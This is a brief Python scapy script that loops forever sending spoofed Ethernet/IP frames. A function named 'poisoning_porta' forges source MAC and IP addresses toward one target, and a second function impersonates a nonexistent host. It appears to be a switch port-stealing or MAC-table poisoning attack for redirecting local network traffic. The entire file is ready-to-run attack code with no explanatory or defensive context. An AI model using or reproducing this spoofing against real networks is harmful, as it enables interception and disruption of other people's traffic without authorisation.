from scapy.all import *
import time

def poisoning_porta():
   p = Ether(src='ca:fe:ba:be:69:01', dst='0a:87:9c:b8:df:29')/IP(src='192.168.0.4', dst='192.168.0.6')
   sendp(p)
   time.sleep(1.5)

def new_fake_host():
   p = Ether(src='bb:bb:bb:bb:69:01', dst='0a:87:9c:b8:df:29')/IP(src='192.168.0.70', dst='192.168.0.6')
   sendp(p)
   time.sleep(1.5)

while 1:
   poisoning_porta()
   new_fake_host()
